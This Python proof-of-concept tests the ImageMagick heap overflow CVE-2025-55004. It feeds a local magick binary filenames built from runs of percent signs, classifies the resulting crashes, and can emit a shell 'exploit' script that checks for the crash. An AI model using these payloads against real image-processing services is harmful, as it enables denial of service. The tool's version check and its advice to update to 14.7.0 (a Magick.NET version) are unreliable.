#!/usr/bin/env python3

"""
CVE-2025-55004 - Enhanced ImageMagick Heap Buffer Overflow POC
Demonstrates heap buffer overflow in InterpretImageFilename function
when processing consecutive percent signs in filename format strings.
"""

import subprocess
import sys
import os
import tempfile
import time
import signal
import psutil
import json
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from datetime import datetime
import argparse
import logging
import threading
import hashlib


@dataclass
class TestResult:
    """Data class to store test results."""
    payload: str
    crashed: bool
    return_code: int
    stderr: str
    stdout: str
    execution_time: float
    memory_usage: Optional[int] = None
    crash_type: Optional[str] = None


class SystemMonitor:
    """Monitor system resources during testing."""
    
    def __init__(self):
        self.monitoring = False
        self.max_memory = 0
        self.cpu_usage = []
        
    def start_monitoring(self, pid: int):
        """Start monitoring a process."""
        self.monitoring = True
        self.max_memory = 0
        self.cpu_usage = []
        
        def monitor():
            try:
                process = psutil.Process(pid)
                while self.monitoring:
                    try:
                        memory_info = process.memory_info()
                        self.max_memory = max(self.max_memory, memory_info.rss)
                        self.cpu_usage.append(process.cpu_percent())
                        time.sleep(0.1)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        break
            except psutil.NoSuchProcess:
                pass
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def stop_monitoring(self) -> Dict[str, Any]:
        """Stop monitoring and return statistics."""
        self.monitoring = False
        return {
            'max_memory_mb': self.max_memory / (1024 * 1024) if self.max_memory else 0,
            'avg_cpu_percent': sum(self.cpu_usage) / len(self.cpu_usage) if self.cpu_usage else 0
        }


class EnhancedCVE202555004POC:
    """Enhanced Proof of Concept for CVE-2025-55004 ImageMagick vulnerability."""
    
    def __init__(self, magick_path: str = None, timeout: int = 10):
        self.magick_path = magick_path or self._find_magick()
        self.timeout = timeout
        self.logger = self._setup_logger()
        self.test_results: List[TestResult] = []
        self.session_id = hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8]
        
    def _setup_logger(self) -> logging.Logger:
        """Configure and return logger instance."""
        logger = logging.getLogger(__name__)
        if not logger.handlers:
            handler = logging.StreamHandler(sys.stderr)
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger
    
    def _find_magick(self) -> str:
        """Find ImageMagick binary in system PATH with enhanced detection."""
        possible_names = ['magick', 'convert', 'identify', 'ImageMagick']
        
        # Check PATH first
        for name in possible_names:
            result = subprocess.run(
                ['which', name], 
                capture_output=True, 
                text=True
            )
            if result.returncode == 0:
                path = result.stdout.strip()
                if self._validate_imagemagick_binary(path):
                    return path
        
        # Try common installation paths
        common_paths = [
            '/usr/bin/magick',
            '/usr/local/bin/magick',
            '/opt/ImageMagick/bin/magick',
            '/snap/bin/imagemagick',
            '/usr/bin/convert',
            '/usr/local/bin/convert',
        ]
        
        for path in common_paths:
            if Path(path).exists() and self._validate_imagemagick_binary(path):
                return path
        
        raise FileNotFoundError(
            "ImageMagick binary not found or invalid. "
            "Please install ImageMagick or specify path with --magick-path"
        )
    
    def _validate_imagemagick_binary(self, path: str) -> bool:
        """Validate that the binary is actually ImageMagick."""
        try:
            result = subprocess.run(
                [path, '-version'], 
                capture_output=True, 
                text=True, 
                timeout=5
            )
            return result.returncode == 0 and 'imagemagick' in result.stdout.lower()
        except:
            return False
    
    def get_version_info(self) -> Dict[str, Any]:
        """Get detailed ImageMagick version information."""
        try:
            result = subprocess.run(
                [self.magick_path, '-version'], 
                capture_output=True, 
                text=True,
                timeout=10
            )
            
            if result.returncode != 0:
                return {'error': 'Failed to get version info'}
            
            version_info = {
                'raw_output': result.stdout,
                'version': 'unknown',
                'build_date': 'unknown',
                'features': [],
                'delegates': [],
                'vulnerable': None
            }
            
            lines = result.stdout.split('\n')
            for line in lines:
                line = line.strip()
                if line.startswith('Version:'):
                    version_info['version'] = line.split(':', 1)[1].strip()
                elif 'build date' in line.lower():
                    version_info['build_date'] = line
                elif line.startswith('Features:'):
                    version_info['features'] = line.split(':', 1)[1].strip().split()
                elif line.startswith('Delegates'):
                    version_info['delegates'] = line.split(':', 1)[1].strip().split()
            
            # Check if version is vulnerable (before 14.7.0 for Magick.NET)
            # This is a simplified check - actual vulnerability depends on source version
            version_str = version_info['version']
            if any(x in version_str for x in ['6.', '7.0', '7.1']):
                version_info['potentially_vulnerable'] = True
            
            return version_info
            
        except Exception as e:
            return {'error': f'Exception getting version: {e}'}
    
    def _analyze_crash(self, stderr: str, return_code: int) -> Optional[str]:
        """Analyze crash output to determine crash type."""
        stderr_lower = stderr.lower()
        
        crash_patterns = {
            'heap_overflow': ['heap-buffer-overflow', 'heap overflow', 'heap corruption'],
            'segfault': ['segmentation fault', 'segfault', 'sigsegv'],
            'abort': ['abort', 'aborted', 'sigabrt'],
            'asan': ['addresssanitizer', 'asan:', '==error:', 'shadow bytes'],
            'memory_error': ['memory error', 'invalid read', 'invalid write'],
            'double_free': ['double free', 'invalid free'],
            'stack_overflow': ['stack overflow', 'stack-buffer-overflow']
        }
        
        for crash_type, patterns in crash_patterns.items():
            if any(pattern in stderr_lower for pattern in patterns):
                return crash_type
        
        # Check return code patterns
        if return_code in [-11, 139]:  # SIGSEGV
            return 'segfault'
        elif return_code in [-6, 134]:  # SIGABRT
            return 'abort'
        elif return_code < 0:
            return f'signal_{abs(return_code)}'
        
        return None
    
    def _execute_payload(self, payload: str, monitor_resources: bool = False) -> TestResult:
        """Execute a single payload and return detailed results."""
        start_time = time.time()
        monitor = SystemMonitor() if monitor_resources else None
        
        try:
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp_file:
                tmp_path = tmp_file.name
            
            # Start process
            process = subprocess.Popen(
                [self.magick_path, payload, tmp_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Start monitoring if requested
            if monitor:
                monitor.start_monitoring(process.pid)
            
            try:
                stdout, stderr = process.communicate(timeout=self.timeout)
                return_code = process.returncode
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return_code = -999  # Custom timeout code
                stderr = f"TIMEOUT: Process killed after {self.timeout}s\n" + (stderr or "")
            
            execution_time = time.time() - start_time
            
            # Stop monitoring
            monitor_data = monitor.stop_monitoring() if monitor else {}
            
            # Analyze crash
            crash_type = self._analyze_crash(stderr, return_code)
            is_crashed = crash_type is not None or return_code != 0
            
            result = TestResult(
                payload=payload,
                crashed=is_crashed,
                return_code=return_code,
                stderr=stderr,
                stdout=stdout,
                execution_time=execution_time,
                memory_usage=monitor_data.get('max_memory_mb'),
                crash_type=crash_type
            )
            
            # Clean up
            try:
                os.unlink(tmp_path)
            except:
                pass
            
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(
                payload=payload,
                crashed=True,
                return_code=-1,
                stderr=f"Exception during execution: {e}",
                stdout="",
                execution_time=execution_time,
                crash_type="exception"
            )
    
    def generate_advanced_payloads(self) -> List[str]:
        """Generate comprehensive list of test payloads."""
        basic_payloads = [
            '%%',           # Basic trigger
            '%%%',          # Triple %
            '%%%%',         # Quad %
            '%%%%%',        # Penta %
        ]
        
        # Extended length payloads
        extended_payloads = [
            '%' * i for i in range(6, 20)  # 6-19 consecutive %
        ]
        
        # Mixed format payloads
        mixed_payloads = [
            '%%test',
            'test%%',
            'test%%test',
            '%%[test]',
            '%%{test}',
            '%%.png',
            '%%/path/file',
        ]
        
        # Edge case payloads
        edge_cases = [
            '%%' + 'A' * 100,     # Long suffix
            'A' * 100 + '%%',     # Long prefix  
            '%%' + '\x00' * 10,   # Null bytes
            '%%' + '\xff' * 10,   # High bytes
            '%' * 256,            # Very long
            '%' * 1000,           # Extremely long
        ]
        
        # Format string variations
        format_variations = [
            '%%d',
            '%%s',
            '%%x',
            '%%p',
            '%%n',
            '%%.%d',
            '%%[width]',
            '%%[height]',
        ]
        
        return basic_payloads + extended_payloads + mixed_payloads + edge_cases + format_variations
    
    def run_comprehensive_test(self, monitor_resources: bool = False) -> Dict[str, Any]:
        """Run comprehensive vulnerability testing."""
        self.logger.info("Starting comprehensive CVE-2025-55004 testing...")
        
        payloads = self.generate_advanced_payloads()
        total_payloads = len(payloads)
        
        # Get version info first
        version_info = self.get_version_info()
        self.logger.info(f"Testing ImageMagick version: {version_info.get('version', 'unknown')}")
        
        results = []
        crashed_count = 0
        
        for i, payload in enumerate(payloads):
            self.logger.info(f"Testing payload {i+1}/{total_payloads}: '{payload[:50]}{'...' if len(payload) > 50 else ''}'")
            
            result = self._execute_payload(payload, monitor_resources)
            results.append(result)
            
            if result.crashed:
                crashed_count += 1
                crash_info = f"CRASH - Type: {result.crash_type}, Code: {result.return_code}"
                if result.memory_usage:
                    crash_info += f", Memory: {result.memory_usage:.1f}MB"
                self.logger.warning(f"  {crash_info}")
            else:
                self.logger.info(f"  OK - No crash detected")
        
        self.test_results = results
        
        # Analyze results
        summary = self._generate_summary(results, version_info)
        
        if crashed_count > 0:
            self.logger.warning(f"VULNERABLE: {crashed_count}/{total_payloads} payloads triggered crashes")
        else:
            self.logger.info("No crashes detected - system may be patched")
        
        return summary
    
    def _generate_summary(self, results: List[TestResult], version_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate comprehensive test summary."""
        crash_types = {}
        total_crashes = 0
        
        for result in results:
            if result.crashed:
                total_crashes += 1
                crash_type = result.crash_type or 'unknown'
                crash_types[crash_type] = crash_types.get(crash_type, 0) + 1
        
        return {
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'imagemagick_version': version_info,
            'total_tests': len(results),
            'total_crashes': total_crashes,
            'crash_types': crash_types,
            'vulnerability_confirmed': total_crashes > 0,
            'most_effective_payload': self._find_most_effective_payload(results),
            'execution_stats': {
                'avg_execution_time': sum(r.execution_time for r in results) / len(results),
                'max_execution_time': max(r.execution_time for r in results),
                'total_test_time': sum(r.execution_time for r in results)
            }
        }
    
    def _find_most_effective_payload(self, results: List[TestResult]) -> Optional[str]:
        """Find the payload that most reliably triggers crashes."""
        crash_results = [r for r in results if r.crashed and r.crash_type != 'exception']
        if not crash_results:
            return None
        
        # Prefer heap overflow crashes
        heap_crashes = [r for r in crash_results if 'heap' in (r.crash_type or '').lower()]
        if heap_crashes:
            return heap_crashes[0].payload
        
        return crash_results[0].payload
    
    def save_report(self, filename: str = None) -> str:
        """Save detailed test report to file."""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"cve-2025-55004_report_{timestamp}.json"
        
        if not self.test_results:
            self.logger.warning("No test results to save")
            return filename
        
        # Create detailed report
        report_data = {
            'cve': 'CVE-2025-55004',
            'description': 'ImageMagick Heap Buffer Overflow in InterpretImageFilename',
            'test_session': {
                'session_id': self.session_id,
                'timestamp': datetime.now().isoformat(),
                'magick_path': self.magick_path,
                'timeout': self.timeout
            },
            'version_info': self.get_version_info(),
            'summary': self._generate_summary(self.test_results, self.get_version_info()),
            'detailed_results': [
                {
                    'payload': r.payload,
                    'crashed': r.crashed,
                    'return_code': r.return_code,
                    'crash_type': r.crash_type,
                    'execution_time': r.execution_time,
                    'memory_usage_mb': r.memory_usage,
                    'stderr_preview': r.stderr[:200] + '...' if len(r.stderr) > 200 else r.stderr
                } for r in self.test_results
            ]
        }
        
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        self.logger.info(f"Detailed report saved to: {filename}")
        return filename
    
    def generate_exploit_script(self, output_file: str = None, include_payloads: List[str] = None) -> str:
        """Generate an enhanced exploit script."""
        if not output_file:
            output_file = f'cve-2025-55004-exploit-{self.session_id}.sh'
        
        if not include_payloads:
            # Use most effective payloads from test results
            if self.test_results:
                crash_payloads = [r.payload for r in self.test_results if r.crashed][:5]
                include_payloads = crash_payloads if crash_payloads else ['%%', '%%%', '%%%%']
            else:
                include_payloads = ['%%', '%%%', '%%%%']
        
        script_content = f'''#!/bin/bash

# CVE-2025-55004 ImageMagick Heap Buffer Overflow Exploit
# Generated by Enhanced POC - Session: {self.session_id}
# Target: {self.magick_path}
# Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

set -e

echo "=========================================="
echo "CVE-2025-55004 ImageMagick Exploit"
echo "Heap Buffer Overflow in InterpretImageFilename"
echo "=========================================="
echo ""

MAGICK_PATH="{self.magick_path}"
TEMP_DIR="/tmp/cve-2025-55004-test"
mkdir -p "$TEMP_DIR"

# Function to test a payload
test_payload() {{
    local payload="$1"
    local output_file="$TEMP_DIR/test_${{RANDOM}}.png"
    
    echo -n "Testing payload '$payload'... "
    
    if timeout 10 "$MAGICK_PATH" "$payload" "$output_file" 2>/dev/null; then
        echo "OK"
        rm -f "$output_file"
        return 1
    else
        local exit_code=$?
        case $exit_code in
            139|11) echo "CRASH (Segmentation Fault)" ;;
            134|6)  echo "CRASH (Abort)" ;;
            124)    echo "TIMEOUT" ;;
            *)      echo "CRASH (Exit code: $exit_code)" ;;
        esac
        rm -f "$output_file"
        return 0
    fi
}}

# Get version info
echo "ImageMagick Version:"
"$MAGICK_PATH" -version | head -3
echo ""

# Test payloads
echo "Testing vulnerability payloads:"
vulnerable=0

'''

        for payload in include_payloads:
            # Escape single quotes in payload for shell script
            escaped_payload = payload.replace("'", "'\"'\"'")
            script_content += f"test_payload '{escaped_payload}' && vulnerable=1\n"

        script_content += '''
echo ""

if [ $vulnerable -eq 1 ]; then
    echo "=========================================="
    echo "RESULT: SYSTEM APPEARS VULNERABLE"
    echo "CVE-2025-55004 confirmed"
    echo "=========================================="
    echo ""
    echo "Recommendation: Update ImageMagick to version 14.7.0 or later"
    echo "Affected versions: < 14.7.0 (Magick.NET packages)"
    exit 1
else
    echo "=========================================="
    echo "RESULT: No crashes detected"
    echo "System may be patched"
    echo "=========================================="
    exit 0
fi

# Cleanup
rm -rf "$TEMP_DIR"
'''
        
        with open(output_file, 'w') as f:
            f.write(script_content)
        
        os.chmod(output_file, 0o755)
        self.logger.info(f"Enhanced exploit script created: {output_file}")
        return output_file


def main():
    """Enhanced main entry point."""
    parser = argparse.ArgumentParser(
        description='Enhanced CVE-2025-55004 ImageMagick Heap Buffer Overflow POC',
        epilog='''
Examples:
  %(prog)s --comprehensive                    # Run full test suite
  %(prog)s --quick-test                       # Quick vulnerability check
  %(prog)s --monitor-resources --comprehensive # Monitor memory/CPU usage
  %(prog)s --save-report report.json          # Save results to file
  %(prog)s --create-exploit exploit.sh        # Generate exploit script
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        '--magick-path',
        help='Path to ImageMagick binary (auto-detected if not specified)'
    )
    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Timeout for each test in seconds (default: 10)'
    )
    parser.add_argument(
        '--comprehensive',
        action='store_true',
        help='Run comprehensive testing with all payload variations'
    )
    parser.add_argument(
        '--quick-test',
        action='store_true',
        help='Run only basic vulnerability tests'
    )
    parser.add_argument(
        '--monitor-resources',
        action='store_true',
        help='Monitor CPU and memory usage during tests'
    )
    parser.add_argument(
        '--save-report',
        metavar='FILENAME',
        help='Save detailed JSON report to file'
    )
    parser.add_argument(
        '--create-exploit',
        metavar='SCRIPT_PATH',
        help='Create enhanced exploit script'
    )
    parser.add_argument(
        '--version-info',
        action='store_true',
        help='Show ImageMagick version information and exit'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging'
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        poc = EnhancedCVE202555004POC(args.magick_path, args.timeout)
        
        # Version info only
        if args.version_info:
            version_info = poc.get_version_info()
            print(json.dumps(version_info, indent=2))
            return
        
        # Create exploit script only
        if args.create_exploit:
            poc.generate_exploit_script(args.create_exploit)
            return
        
        # Determine test mode
        if args.quick_test:
            # Quick test with basic payloads only
            basic_payloads = ['%%', '%%%', '%%%%']
            results = []
            for payload in basic_payloads:
                result = poc._execute_payload(payload)
                results.append(result)
            poc.test_results = results
            summary = poc._generate_summary(results, poc.get_version_info())
        else:
            # Comprehensive test (default if no mode specified)
            summary = poc.run_comprehensive_test(args.monitor_resources)
        
        # Save report if requested
        if args.save_report:
            poc.save_report(args.save_report)
        
        # Print summary
        print("\n" + "="*60)
        print("VULNERABILITY TEST SUMMARY")
        print("="*60)
        print(f"Total tests: {summary['total_tests']}")
        print(f"Crashes detected: {summary['total_crashes']}")
        print(f"Vulnerability confirmed: {'YES' if summary['vulnerability_confirmed'] else 'NO'}")
        
        if summary['crash_types']:
            print(f"Crash types: {', '.join(summary['crash_types'].keys())}")
        
        if summary['most_effective_payload']:
            print(f"Most effective payload: '{summary['most_effective_payload']}'")
        
        print("="*60)
        
        # Exit with appropriate code
        sys.exit(1 if summary['vulnerability_confirmed'] else 0)
        
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
